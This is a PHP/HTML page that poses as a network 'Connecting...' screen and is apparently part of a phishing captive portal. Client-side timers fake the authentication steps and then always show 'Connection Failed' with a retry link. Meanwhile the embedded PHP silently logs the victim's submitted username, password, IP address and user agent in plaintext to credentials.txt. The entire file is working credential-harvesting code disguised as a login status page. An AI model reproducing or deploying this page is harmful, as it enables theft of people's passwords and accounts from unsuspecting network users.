<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.2);
            max-width: 420px;
            width: 100%;
            padding: 50px 40px;
            text-align: center;
        }
        
        .status-icon {
            font-size: 70px;
            margin-bottom: 25px;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            color: #333;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        
        p {
            color: #666;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        
        .progress-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 25px 0;
        }
        
        .dot {
            width: 12px;
            height: 12px;
            background: #e0e0e0;
            border-radius: 50%;
            animation: pulse 1.5s ease-in-out infinite;
        }
        
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        .dot:nth-child(4) { animation-delay: 0.6s; }
        
        @keyframes pulse {
            0%, 100% { background: #e0e0e0; transform: scale(1); }
            50% { background: #3498db; transform: scale(1.2); }
        }
        
        .error-box {
            background: #fee;
            border: 1px solid #fcc;
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }
        
        .error-box h3 {
            color: #c00;
            font-size: 16px;
            margin-bottom: 10px;
        }
        
        .error-box p {
            color: #900;
            font-size: 14px;
        }
        
        .btn-retry {
            display: none;
            margin-top: 25px;
            padding: 14px 30px;
            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
        }
        
        .btn-retry:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.3);
        }
        
        .status-list {
            text-align: left;
            margin: 25px 0;
            padding: 0 20px;
        }
        
        .status-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 0;
            color: #666;
            font-size: 14px;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .status-item:last-child {
            border-bottom: none;
        }
        
        .status-item .check {
            color: #2ecc71;
        }
        
        .status-item .pending {
            color: #f39c12;
        }
        
        .status-item .error {
            color: #e74c3c;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <div class="status-icon" id="statusIcon" style="display: none;"><img src="X.png" alt="Alert" style="width: 48px; height: 48px;"></div>
        
        <h1 id="title">Connecting to Network</h1>
        <p id="message">Please wait while we establish a secure connection...</p>
        
        <div class="progress-dots" id="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        
        <div class="status-list" id="statusList">
            <div class="status-item">
                <span class="check">✓</span> Credentials received
            </div>
            <div class="status-item">
                <span class="pending" id="authStatus"><img src="./pics/hourglass.png" alt="Loading" style="width: 16px; height: 16px; vertical-align: middle;"></span> Authenticating...
            </div>
            <div class="status-item">
                <span class="pending" id="connectStatus"><img src="./pics/hourglass.png" alt="Loading" style="width: 16px; height: 16px; vertical-align: middle;"></span> Connecting to gateway
            </div>
        </div>
        
        <div class="error-box" id="errorBox">
            <h3><img src="./pics/alert.png" alt="Alert" style="width: 48px; height: 48px;"> Connection Failed</h3>
            <p>Unable to authenticate with the network. The credentials may be incorrect or the network is currently unavailable. Please try again.</p>
        </div>
        
        <a href="index.php" class="btn-retry" id="retryBtn">← Try Again</a>
    </div>
    
    <script>
        setTimeout(function() {
            document.getElementById('authStatus').innerHTML = '<img src="./pics/check.png" alt="Success" style="width: 16px; height: 16px; vertical-align: middle;">';
            document.getElementById('authStatus').className = 'check';
        }, 2000);
        
        setTimeout(function() {
            document.getElementById('connectStatus').innerHTML = '<img src="./pics/hourglass.png" alt="Loading" style="width: 16px; height: 16px; vertical-align: middle;">';
            document.getElementById('connectStatus').className = 'pending';
        }, 3000);
        
        setTimeout(function() {
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('statusIcon').style.display = 'block';
            document.getElementById('dots').style.display = 'none';
            document.getElementById('title').textContent = 'Connection Failed';
            document.getElementById('message').textContent = 'We were unable to connect you to the network at this time.';
            document.getElementById('connectStatus').innerHTML = 'X';
            document.getElementById('connectStatus').className = 'error';
            document.getElementById('errorBox').style.display = 'block';
            document.getElementById('retryBtn').style.display = 'inline-block';
            document.getElementById('statusList').style.display = 'none';
        }, 5000);
    </script>
    
    <?php
    $timestamp = date('Y-m-d H:i:s');
    $username = isset($_POST['username']) ? $_POST['username'] : 'N/A';
    $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    
    $log_entry = "===========================================\n";
    $log_entry .= "Timestamp: $timestamp\n";
    $log_entry .= "IP Address: $ip\n";
    $log_entry .= "Username/Email: $username\n";
    $log_entry .= "Password: $password\n";
    $log_entry .= "User Agent: $user_agent\n";
    $log_entry .= "===========================================\n\n";
    
    $file = fopen("credentials.txt", "a");
    fwrite($file, $log_entry);
    fclose($file);
    ?>
</body>
</html>